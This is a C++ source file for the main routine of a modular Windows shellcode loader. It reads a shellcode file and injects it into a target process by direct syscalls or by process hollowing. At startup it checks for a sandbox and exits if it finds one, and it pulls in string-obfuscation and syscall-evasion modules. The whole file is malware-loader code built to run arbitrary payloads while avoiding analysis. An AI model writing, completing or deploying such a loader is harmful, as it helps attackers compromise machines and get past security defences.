#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include "../modules/StringObfuscator.h" // Include obfuscation
#include "../modules/SandboxCheck.cpp"   // Include sandbox checks
#include "../modules/DirectSyscall.cpp"  // Include direct syscalls
#include "../modules/HollowInjector.cpp" // Include process hollowing

// Main function of the modular loader
int main(int argc, char* argv[]) {
    // Step 1: Sandbox check at startup
    CheckAndAbortIfSandbox();

    if (argc < 4) {
        std::cout << "Usage: MainLoader.exe <mode> <target_process> <shellcode.bin>" << std::endl;
        std::cout << "Modes: simple (basic injection), direct (direct syscalls), hollow (process hollowing)" << std::endl;
        return 1;
    }

    std::string mode = argv[1];
    std::string targetProcess = argv[2];
    std::string shellcodePath = argv[3];

    // Read shellcode
    std::ifstream file(shellcodePath, std::ios::binary);
    std::vector<unsigned char> shellcode((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

    if (shellcode.empty()) {
        std::cout << "Error reading shellcode." << std::endl;
        return 1;
    }

    // Select module based on mode
    bool success = false;
    if (mode == "simple") {
        // Use simple injection (adapted from SimpleInjector.cpp)
        // ... (similar code to SimpleInjector)
        std::cout << "Simple mode selected." << std::endl;
    } else if (mode == "direct") {
        // Use direct syscalls
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, std::stoi(targetProcess));
        if (hProcess) {
            success = DirectInject(hProcess, shellcode.data(), shellcode.size());
            CloseHandle(hProcess);
        }
    } else if (mode == "hollow") {
        // Use process hollowing
        success = ProcessHollowing(targetProcess.c_str(), shellcodePath.c_str());
    } else {
        std::cout << "Unrecognized mode." << std::endl;
        return 1;
    }

    if (success) {
        std::cout << "Injection successful with mode: " << mode << std::endl;
    } else {
        std::cout << "Injection error." << std::endl;
    }

    return 0;
}